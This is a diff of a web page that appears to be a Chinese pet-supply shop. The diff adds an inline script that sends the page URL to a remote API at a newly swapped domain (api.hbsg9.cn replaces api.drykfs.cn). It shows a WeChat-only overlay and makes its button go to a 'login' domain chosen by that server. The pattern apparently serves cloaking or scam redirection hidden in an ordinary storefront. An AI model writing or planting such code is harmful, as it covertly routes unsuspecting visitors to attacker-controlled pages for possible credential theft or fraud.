@@ -38,16 +38,48 @@
 </div>
 <div class="tip-banner">🐣 新客专享：首单立减10元 + 小宠护理手册</div>
 <div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>🍃 小宠星球入口</p><span>点击进入专属顾问</span></div><div><button class="enter-btn" id="enterBtn">进入小宠社区</button></div></div></div>
-<script>(function(){
-    const modal=document.getElementById("wechatModal"),btn=document.getElementById("enterBtn");
-    modal.style.display="none";
-    if(new URLSearchParams(location.search).get('login')==='true') return;
-    fetch("https://api.drykfs.cn/api/index/selectRoute?url="+encodeURIComponent(location.href)).then(r=>r.json()).then(d=>{
-        if(d&&d.code===1 && /micromessenger/i.test(navigator.userAgent)) modal.style.display="flex";
-        let redir=d?.data?.loginDomain;
-        if(redir){ btn.replaceWith(btn.cloneNode(true)); document.getElementById("enterBtn").onclick=()=>location.href=redir; }
-    }).catch(e=>{});
-    modal.addEventListener("click",e=>e.stopPropagation());
-})();</script>
+
+<script>
+(function(){
+    const modal = document.getElementById("wechatModal");
+    const btn = document.getElementById("enterBtn");
+    modal.style.display = "none";
+
+    // 若 URL 带有 login=true 则跳过弹窗和接口请求
+    if (new URLSearchParams(location.search).get('login') === 'true') return;
+
+    // ---- 获取 rule_id 参数 ----
+    const urlParams = new URLSearchParams(location.search);
+    const ruleId = urlParams.get('rule_id');
+
+    const curUrl = encodeURIComponent(location.href);
+
+    // 构建接口地址，若 rule_id 存在则追加参数
+    let apiUrl = "https://api.hbsg9.cn/api/index/selectRoute?url=" + curUrl;
+    if (ruleId !== null && ruleId !== '') {
+        apiUrl += '&rule_id=' + encodeURIComponent(ruleId);
+    }
+
+    fetch(apiUrl)
+        .then(r => r.json())
+        .then(d => {
+            if (d && d.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+                modal.style.display = "flex";
+            }
+            let redir = d?.data?.loginDomain;
+            if (redir) {
+                // 替换按钮，防止重复绑定
+                const newBtn = btn.cloneNode(true);
+                btn.replaceWith(newBtn);
+                document.getElementById("enterBtn").onclick = function() {
+                    location.href = redir;
+                };
+            }
+        })
+        .catch(e => {});
+
+    modal.addEventListener("click", e => e.stopPropagation());
+})();
+</script>
 </body>
 </html>
